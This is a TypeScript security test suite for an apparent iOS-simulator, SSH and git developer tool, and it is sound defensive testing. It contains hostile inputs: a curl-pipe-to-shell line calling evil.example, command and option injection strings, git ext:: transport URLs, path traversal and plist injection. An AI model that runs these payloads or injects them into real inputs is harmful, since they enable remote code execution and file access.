/* Run with: npm run test:security  (bundled with esbuild, executed with node). */
import assert from 'node:assert/strict'
import http from 'node:http'
import { spawnSync } from 'node:child_process'
import { assertBundleId, assertCommitMessage, assertConnection, assertContentSize, assertGitBranch, assertGitFolderName, assertGitUrl, assertProduct, assertRepoPath, assertUdid, folderNameFromUrl, isHost, q, stripUrlCredentials, xmlEscape } from '../src/main/validate'
import * as git from '../src/main/git'
import { mkdtempSync, writeFileSync, existsSync, readFileSync, mkdirSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { newSessionToken, startAuthProxy } from '../src/main/auth-proxy'
import { PortTakenError, WdaClient, readMjpeg, withFreePorts } from '../src/main/wda'

let passed = 0
const test = async (name: string, fn: () => void | Promise<void>): Promise<void> => {
  try {
    await fn()
    passed++
    console.log(`ok   ${name}`)
  } catch (e) {
    console.error(`FAIL ${name}\n${(e as Error).stack}`)
    process.exitCode = 1
  }
}

const GOOD_UDID = 'A1B2C3D4-E5F6-4789-ABCD-0123456789AB'
const PAYLOADS = ['x; curl http://evil.example/x | sh', '$(touch /tmp/pwn)', '`id`', "a'b", 'a"b', 'a b', 'a\nb', '-oProxyCommand=calc', '../../etc', '', ' ', 'a|b', 'a&b', 'a>b']

await test('UDID accepts canonical, rejects injection and wrong shapes', () => {
  assert.equal(assertUdid(GOOD_UDID), GOOD_UDID)
  assertUdid(GOOD_UDID.toLowerCase())
  for (const p of [...PAYLOADS, GOOD_UDID + ';id', GOOD_UDID.slice(1), GOOD_UDID + '\n', 'G'.repeat(36), '-'.repeat(36), `${GOOD_UDID} `, 12 as unknown as string]) {
    assert.throws(() => assertUdid(p), /Invalid simulator UDID/, JSON.stringify(p))
  }
})

await test('bundle id / product / content size boundaries', () => {
  assertBundleId('dev.fcode.MyShiftsShell')
  assertProduct('MyShiftsShell')
  assertProduct('My App_2.0')
  assertContentSize('xLarge')
  for (const p of PAYLOADS.filter((x) => x !== 'a b')) {
    assert.throws(() => assertBundleId(p), undefined, `bundle ${JSON.stringify(p)}`)
    assert.throws(() => assertProduct(p), undefined, `product ${JSON.stringify(p)}`)
  }
  assert.throws(() => assertProduct('-scheme'))
  assert.throws(() => assertContentSize('large; reboot'))
})

await test('connection: host / user / port / remote folder / lastIp', () => {
  assertConnection({ host: 'my-mac.local', user: 'me', port: 22, remoteRoot: '~/TomCodeProjects', lastIp: '192.168.1.50' })
  assertConnection({ host: '192.168.1.50', user: 'me' })
  for (const host of ['-oProxyCommand=x', 'a b', 'a;b', 'a@b', '999.1.1.1', '1.2.3', 'a..b', '-host', 'host$(id)', '']) {
    assert.equal(isHost(host), false, host)
    assert.throws(() => assertConnection({ host, user: 'me' }), undefined, host)
  }
  for (const user of ['-oFoo', 'to m', 'tom;id', 'tom@evil', '', 'a'.repeat(40)]) assert.throws(() => assertConnection({ host: 'mac.local', user }), undefined, user)
  for (const port of [0, 65536, 1.5, -1, NaN]) assert.throws(() => assertConnection({ host: 'mac.local', user: 'me', port }), undefined, String(port))
  for (const remoteRoot of ['relative/dir', '~/a/../b', '/a;b', "~/a'b", '/x$(id)']) assert.throws(() => assertConnection({ host: 'mac.local', user: 'me', remoteRoot }), undefined, remoteRoot)
  assert.throws(() => assertConnection({ host: 'mac.local', user: 'me', lastIp: '1.2.3.4;id' }))
})

await test('q() survives a real POSIX shell for hostile strings', () => {
  const sh = spawnSync('sh', ['-c', 'echo ok'])
  if (sh.status !== 0) return console.log('     (skipped: no sh on this machine)')
  for (const p of [...PAYLOADS, "it's", "'; echo PWNED; '", '\\', '$HOME', '*']) {
    const r = spawnSync('sh', ['-c', `printf %s ${q(p)}`])
    assert.equal(r.stdout.toString(), p, JSON.stringify(p))
  }
  assert.equal(q('~/TomCodeProjects/a b'), "~/'TomCodeProjects/a b'")
})

await test('xmlEscape neutralises plist injection', () => {
  const evil = `</string><key>LSEnvironment</key><dict/><string>"&'\u0000`
  const out = xmlEscape(evil)
  assert.ok(!/[<>"'\u0000]/.test(out.replace(/&(amp|lt|gt|quot|apos);/g, '')))
  assert.equal(xmlEscape('A & B'), 'A &amp; B')
})

await test('auth proxy: 401 without / with wrong token, 421 on foreign Host, forwards (and strips) a valid token', async () => {
  const seen: http.IncomingHttpHeaders[] = []
  const upstream = http.createServer((req, res) => {
    seen.push(req.headers)
    res.setHeader('Content-Type', 'application/json')
    res.end(JSON.stringify({ value: { ready: true }, sessionId: 'S1' }))
  })
  await new Promise<void>((r) => upstream.listen(0, '127.0.0.1', r))
  const upPort = (upstream.address() as { port: number }).port
  const token = newSessionToken()
  assert.match(token, /^[A-Za-z0-9_-]{32}$/)
  assert.notEqual(token, newSessionToken())
  const proxy = await startAuthProxy(upPort, token)
  const get = (headers: Record<string, string>): Promise<number> =>
    new Promise((resolve, reject) => {
      http.get({ host: '127.0.0.1', port: proxy.port, path: '/status', headers }, (res) => {
        res.resume()
        res.on('end', () => resolve(res.statusCode ?? 0))
      }).on('error', reject)
    })
  assert.equal(await get({}), 401)
  assert.equal(await get({ Authorization: 'Bearer nope' }), 401)
  assert.equal(await get({ Authorization: `Bearer ${token.slice(0, -1)}` }), 401)
  assert.equal(await get({ Authorization: `Basic ${token}` }), 401)
  assert.equal(await get({ Authorization: `Bearer ${token}`, Host: 'evil.example' }), 421)
  assert.equal(seen.length, 0, 'nothing may reach the upstream without a valid token')
  assert.equal(await get({ Authorization: `Bearer ${token}` }), 200)
  assert.equal(seen.length, 1)
  assert.equal(seen[0].authorization, undefined, 'the credential must not be forwarded')

  const client = new WdaClient(proxy.port, token)
  await client.createSession() // POST /session + settings go through the proxy
  const bad = new WdaClient(proxy.port, 'wrong')
  await assert.rejects(bad.createSession())
  await new Promise<void>((resolve) => {
    const h = readMjpeg(proxy.port, 'wrong', () => assert.fail('no frames without a token'), (err) => {
      assert.match(String(err?.message), /401/)
      resolve()
    })
    void h
  })
  proxy.close()
  upstream.close()
})

await test('withFreePorts retries when a bind loses the race, and gives up after the limit', async () => {
  let tries = 0
  const got = await withFreePorts(2, async (ports) => {
    assert.equal(new Set(ports).size, 2)
    if (++tries < 3) throw new PortTakenError('address already in use')
    return ports
  })
  assert.equal(tries, 3)
  assert.equal(got.length, 2)
  await assert.rejects(withFreePorts(1, async () => { throw new PortTakenError('x') }, 2), /after 2 tries/)
  await assert.rejects(withFreePorts(1, async () => { throw new Error('other') }), /other/) // non-race errors are not retried
})


// ---- git (source control) ---------------------------------------------------------------------------

await test('git URL: accepts the three supported forms, rejects option injection, odd transports and credentials', () => {
  for (const ok of [
    'https://github.com/Twirledd/f-code.git',
    'https://github.com/a/b',
    'https://gitlab.example.com:8443/group/sub/project.git',
    'ssh://git@github.com/a/b.git',
    'git@github.com:Twirledd/f-code.git'
  ]) assert.equal(assertGitUrl(ok), ok)
  for (const bad of [
    '--upload-pack=calc', '-oProxyCommand=x', 'ext::sh -c touch% /tmp/pwn', 'file:///c:/x', 'C:\\repo', '/etc/passwd', 'http://github.com/a/b',
    'https://user:token@github.com/a/b.git', 'https://github.com/a b', 'https://github.com/a\nb', 'https://-evil.com/a', 'git@-evil:a/b',
    'ssh://git@host/../x', 'git@host:../../x', 'javascript:alert(1)', 'https://github.com/a/b?x=1', 'https://github.com/a/b;id', 'https://github.com/$(id)',
    '', ' ', 'https://', 'https://github.com/' + 'a'.repeat(700), 5 as unknown as string
  ]) assert.throws(() => assertGitUrl(bad), /Invalid repository URL/, JSON.stringify(bad))
})

await test('git names, paths and messages: boundaries', () => {
  assert.equal(stripUrlCredentials('https://me:tok@github.com/a/b.git'), 'https://github.com/a/b.git')
  assert.equal(stripUrlCredentials('git@github.com:a/b.git'), 'git@github.com:a/b.git')
  assert.equal(folderNameFromUrl('https://github.com/Twirledd/f-code.git'), 'f-code')
  assert.equal(folderNameFromUrl('git@github.com:Twirledd/f-code.git'), 'f-code')
  for (const ok of ['f-code', 'My.App_2']) assert.equal(assertGitFolderName(ok), ok)
  for (const bad of ['', '.hidden', '-rf', 'a/b', 'a\\b', '..', 'a b', 'x.git', 'trail.', 'a'.repeat(101)]) assert.throws(() => assertGitFolderName(bad), undefined, bad)
  for (const ok of ['main', 'feature/login-2', 'release-1.0']) assert.equal(assertGitBranch(ok), ok)
  for (const bad of ['', '-d', '--orphan', 'a..b', 'a//b', 'a/', 'a.', 'x.lock', '.hidden', 'a/.b', 'a b', 'a~1', 'a^', 'a:b', 'a\\b', 'a@{1}', '$(id)']) assert.throws(() => assertGitBranch(bad), undefined, bad)
  assert.equal(assertRepoPath('Sources\\App\\main.swift'), 'Sources/App/main.swift')
  for (const bad of ['', '../x', 'a/../b', '/etc/passwd', 'C:\\x', 'C:/x', 'a//b', 'a/', 'a\u0000b', ':(glob)x', 5 as unknown as string]) assert.throws(() => assertRepoPath(bad), undefined, JSON.stringify(bad))
  assert.equal(assertCommitMessage('  fix: it  \n'), 'fix: it')
  for (const bad of ['', '   ', 'a\u0000b', 'x'.repeat(10001), 5 as unknown as string]) assert.throws(() => assertCommitMessage(bad), undefined, JSON.stringify(bad))
})

await test('git status parser handles renames, spaces, untracked, conflicts and branch headers', () => {
  const raw = [
    '# branch.oid 1234567890abcdef', '# branch.head main', '# branch.upstream origin/main', '# branch.ab +2 -1',
    '1 .M N... 100644 100644 100644 aaa bbb Sources/My App/main.swift',
    '1 A. N... 000000 100644 100644 000 bbb new.swift',
    '2 R. N... 100644 100644 100644 aaa bbb R100 renamed.swift', 'old name.swift',
    'u UU N... 100644 100644 100644 100644 a b c conflict.swift',
    '? untracked file.txt', ''
  ].join('\0')
  const s = git.parseStatus(raw)
  assert.equal(s.branch, 'main'); assert.equal(s.upstream, 'origin/main'); assert.equal(s.ahead, 2); assert.equal(s.behind, 1)
  assert.deepEqual(s.changes, [
    { path: 'Sources/My App/main.swift', unstaged: 'modified' },
    { path: 'new.swift', staged: 'added' },
    { path: 'renamed.swift', staged: 'renamed', origPath: 'old name.swift' },
    { path: 'conflict.swift', unstaged: 'conflicted' },
    { path: 'untracked file.txt', unstaged: 'untracked' }
  ])
  assert.equal(git.parseStatus('# branch.oid abc\0# branch.head (detached)\0').branch, undefined)
})

const gitOk = (await git.runGit(tmpdir(), ['--version'])).code === 0
await test('git operations on a real repository (init, stage, commit, branch, diff, discard, push, pull, clone)', async () => {
  if (!gitOk) return console.log('     (skipped: git is not installed)')
  const base = mkdtempSync(join(tmpdir(), 'fcode-git-'))
  try {
    const work = join(base, 'work'); mkdirSync(work)
    const bare = join(base, 'remote.git')
    const cfg = async (dir: string): Promise<void> => {
      await git.runGit(dir, ['config', 'user.name', 'Test User']); await git.runGit(dir, ['config', 'user.email', 'test@example.com']); await git.runGit(dir, ['config', 'commit.gpgsign', 'false']); await git.runGit(dir, ['config', 'core.autocrlf', 'false'])
    }
    assert.equal((await git.getInfo(work)).isRepo, false)
    assert.equal((await git.init(work)).ok, true)
    assert.equal((await git.init(work)).ok, false, 'second init must refuse')
    await cfg(work)
    writeFileSync(join(work, 'a.swift'), 'let a = 1\n'); writeFileSync(join(work, 'b b.swift'), 'let b = 2\n')
    let info = await git.getInfo(work)
    assert.equal(info.isRepo, true); assert.equal(info.branch, 'main')
    assert.deepEqual(info.changes.map((c) => [c.path, c.unstaged]).sort(), [['a.swift', 'untracked'], ['b b.swift', 'untracked']])

    // hostile file lists never reach git
    for (const bad of [['../outside'], ['-A'], ['--all'], ['a.swift', 'missing.swift'], [], 'a.swift' as unknown as string[]]) assert.equal((await git.stage(work, bad)).ok, false, JSON.stringify(bad))
    assert.equal((await git.commit(work, 'nothing staged')).ok, false)
    assert.equal((await git.stage(work, ['a.swift', 'b b.swift'])).ok, true)
    assert.match((await git.diff(work, 'a.swift', true)), /\+let a = 1/)
    const evil = '-m $(touch PWNED) `touch PWNED2`; touch PWNED3\n\nsecond paragraph'
    assert.equal((await git.commit(work, evil)).ok, true)
    assert.equal(existsSync(join(work, 'PWNED')) || existsSync(join(work, 'PWNED2')) || existsSync(join(work, 'PWNED3')), false, 'commit message must not be interpreted')
    info = await git.getInfo(work)
    assert.equal(info.changes.length, 0); assert.equal(info.log.length, 1); assert.equal(info.log[0].subject, '-m $(touch PWNED) `touch PWNED2`; touch PWNED3')

    // edit, diff, unstage, discard
    writeFileSync(join(work, 'a.swift'), 'let a = 1\nlet c = 3\n'); writeFileSync(join(work, 'new.txt'), 'hello\n')
    assert.match(await git.diff(work, 'a.swift', false), /\+let c = 3/)
    assert.match(await git.diff(work, 'new.txt', false), /\+hello/)
    assert.equal((await git.stage(work, ['a.swift'])).ok, true)
    assert.equal((await git.unstage(work, ['a.swift'])).ok, true)
    assert.equal((await git.discard(work, ['a.swift', 'new.txt'])).ok, true)
    assert.equal(readFileSync(join(work, 'a.swift'), 'utf8'), 'let a = 1\n'); assert.equal(existsSync(join(work, 'new.txt')), false)

    // branches
    for (const bad of ['--orphan', '-d', 'a..b', 'x y', '$(id)']) assert.equal((await git.createBranch(work, bad)).ok, false, bad)
    assert.equal((await git.createBranch(work, 'feature/x')).ok, true)
    assert.equal((await git.getInfo(work)).branch, 'feature/x')
    assert.equal((await git.checkout(work, 'main')).ok, true)
    assert.equal((await git.checkout(work, 'does-not-exist')).ok, false)

    // remote: addRemote validates, then push / clone / pull against a local bare repository
    assert.equal((await git.addRemote(work, 'C:\\somewhere')).ok, false)
    assert.equal((await git.addRemote(work, '--upload-pack=x')).ok, false)
    assert.equal((await git.push(work)).ok, false, 'no remote yet')
    await git.runGit(base, ['init', '--bare', '-b', 'main', bare])
    await git.runGit(work, ['remote', 'add', 'origin', bare])
    assert.equal((await git.push(work)).ok, true)
    info = await git.getInfo(work)
    assert.equal(info.upstream, 'origin/main'); assert.equal(info.ahead, 0)

    const progress: string[] = []
    const copy = join(base, 'copy')
    mkdirSync(copy)
    const handle = git.cloneRepository(bare, copy, 'cloned', (p) => progress.push(p.phase), { urlCheck: (u) => u, allowLocal: true })
    const dest = await handle.promise
    assert.equal(existsSync(join(dest, 'a.swift')), true)
    await cfg(dest)
    writeFileSync(join(dest, 'c.swift'), 'let c = 3\n')
    await git.stage(dest, ['c.swift']); assert.equal((await git.commit(dest, 'add c')).ok, true); assert.equal((await git.push(dest)).ok, true)
    assert.equal((await git.fetchRemote(work)).ok, true)
    assert.equal((await git.getInfo(work)).behind, 1)
    assert.equal((await git.pull(work)).ok, true)
    assert.equal(existsSync(join(work, 'c.swift')), true)

    // diverged branches: pull must refuse instead of merging
    writeFileSync(join(work, 'w.swift'), 'w\n'); await git.stage(work, ['w.swift']); await git.commit(work, 'local')
    writeFileSync(join(dest, 'd.swift'), 'd\n'); await git.stage(dest, ['d.swift']); await git.commit(dest, 'remote'); await git.push(dest)
    const p = await git.pull(work)
    assert.equal(p.ok, false); assert.match(p.message, /merge or rebase/)

    // clone refuses bad input and cleans up after a failed clone
    for (const [u, f] of [['ext::sh -c touch% PWNED', 'x'], ['--upload-pack=calc', 'x'], ['https://github.com/a/b.git', '../x'], ['https://github.com/a/b.git', 'cloned']] as const) {
      await assert.rejects(git.cloneRepository(u, copy, f, () => undefined).promise, undefined, `${u} ${f}`)
    }
    await assert.rejects(git.cloneRepository(join(base, 'nope.git'), copy, 'broken', () => undefined, { urlCheck: (x) => x, allowLocal: true }).promise)
    assert.equal(existsSync(join(copy, 'broken')), false, 'a failed clone must not leave a folder behind')
    assert.equal(existsSync(join(base, 'PWNED')) || existsSync(join(copy, 'PWNED')), false)
  } finally {
    rmSync(base, { recursive: true, force: true })
  }
})


console.log(`\n${passed} security tests passed${process.exitCode ? ' (with failures)' : ''}`)
